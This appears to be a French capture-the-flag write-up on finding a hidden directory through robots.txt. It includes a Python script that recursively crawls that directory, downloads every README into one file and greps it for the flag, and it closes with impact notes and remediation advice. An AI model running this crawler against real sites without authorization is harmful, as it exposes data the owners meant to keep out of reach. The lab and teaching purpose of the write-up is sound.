# README : Crawling automatique de fichiers README

## Description

Cette brèche met en évidence une vulnabilité dans la gestion des informations sensibles sur un site web. Elle permet à un attaquant potentiel d'automatiser le processus de recherche et d'extraction de fichiers README contenant des informations confidentielles.

## Fonctionnement

- Accédez à la page robots.txt : `http://X.X.X.X/robots.txt`
- Observez les chemins interdits :

```http
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

- Allez vers le chemin interdit : `http://X.X.X.X/.hidden/`
- Utilisez un script Python pour crawler automatique des pages contenant README :

```python
import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import time

def crawl(url, output_file, visited):
    # Vérifie si l'URL a déjà été visitée
    if url in visited:
        return
    visited.add(url)  # Marquer l'URL comme visitée

    try:
        # Envoyer une requête HTTP à l'URL
        response = requests.get(url)
        response.raise_for_status()  # Vérifie que la requête a réussi

        # Analyser le contenu HTML de la page
        soup = BeautifulSoup(response.text, 'html.parser')

        # Trouver tous les liens sur la page
        links = soup.find_all('a')

        for link in links:
            href = link.get('href')
            if href:
                # Construire l'URL complète en utilisant urljoin
                full_url = urljoin(url, href)

                # Si le lien contient 'README', télécharger le contenu
                if 'README' in href:
                    download_readme(full_url, output_file)

                # Si c'est un sous-dossier, appeler la fonction récursivement
                elif href.endswith('/'):
                    crawl(full_url, output_file, visited)

        time.sleep(0.007)  # Délai d'une seconde entre les requêtes
    except Exception as e:
        print(f"Erreur lors de l'accès à {url}: {e}")

def download_readme(url, output_file):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Vérifie que la requête a réussi

        # Écrire le chemin complet du README dans le fichier de sortie
        with open(output_file, 'a', encoding='utf-8') as file:
            path_parts = url.split('/')
            normalized_path = '/'.join(path_parts[3:])  # Ignore les deux premiers éléments (schéma et domaine)
            file.write(f"{normalized_path}\n")  # Écrire uniquement l'URL complète sans ../
            file.write(response.text + "\n")  # Écrire le contenu du README

    except requests.exceptions.ConnectionError as e:
        print(f"Erreur de connexion lors du téléchargement de {url}: {e}")
    except requests.exceptions.Timeout as e:
        print(f"Délai d'attente dépassé lors du téléchargement de {url}: {e}")
    except requests.exceptions.RequestException as e:
        print(f"Une erreur s'est produite lors de la demande à {url}: {e}")

# URL de départ et fichier de sortie
start_url = 'http://X.X.X.X/.hidden/'  # Remplacez par l'URL de votre choix
output_file = 'readme_contents.txt'

# Ensemble pour suivre les URL visitées
visited_urls = set()

# Lancer le crawler
crawl(start_url, output_file, visited_urls)

print("Mission terminée, retrouve mon rapport dans", output_file)
```

- Utilisez grep "flag" dans le fichier output et le flag apparaitra.

## Impact

Cette vulnérabilité peut permettre à un attaquant de :

- Automatiser la recherche et l'extraction de fichiers README sur le site
- Potentiellement obtenir accès à des informations sensibles stockées dans ces fichiers
- Déchiffrer ou exposer des données confidentielles

## Recommandations

Pour corriger cette vulnérabilité :

- Ne pas stocker des informations sensibles dans des fichiers README accessibles publiquement
- Implémenter une protection anti-crawling robuste pour empêcher l'accès non autorisé aux dossiers sensibles
- Utiliser HTTPS pour sécuriser toutes les communications avec le serveur
- Limiter l'accès aux dossiers contenant des informations confidentielles
- Vérifier régulièrement les fichiers README pour détecter toute information sensible qui pourrait avoir été ajoutée par erreur
